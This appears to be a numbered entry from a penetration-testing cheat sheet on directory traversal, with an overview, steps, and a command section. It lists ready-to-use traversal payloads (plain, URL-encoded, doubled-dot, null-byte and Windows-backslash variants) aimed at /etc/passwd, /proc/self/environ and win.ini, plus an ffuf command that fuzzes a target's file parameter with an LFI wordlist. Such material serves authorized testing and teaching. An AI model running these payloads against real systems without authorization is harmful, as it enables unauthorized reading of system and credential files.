# 04.01 Directory Traversal

> Climb out of a file parameter with `../`, URL encoding (`%2e%2e%2f`), null bytes, or Windows backslashes to read arbitrary files.

## Overview

Any param that resolves a filename on disk and includes/serves it. `../` climbs up. Encoding (`%2e%2e%2f`), null bytes (`%00`), and Windows backslashes can bypass naive filters.

## Steps

- **Find filename param** — `file=foo.txt`, `page=home`.
- **Try basic traversal** — `../../../../etc/passwd`.
- **Encode** if literal `..` filtered.
- **Targets** — /etc/passwd, /proc/self/environ, Windows: c:\\windows\\win.ini, web.config.

## Commands

### Probe payloads

```text
?file=../../../../etc/passwd
?file=..%2f..%2f..%2fetc%2fpasswd
?file=....//....//....//etc/passwd
?file=/etc/passwd%00
?file=..\\..\\..\\windows\\win.ini
```

### Auto-fuzz with ffuf

```bash
ffuf -u 'http://<TARGET>/index.php?file=FUZZ' -w /usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt -mr 'root:x'
```
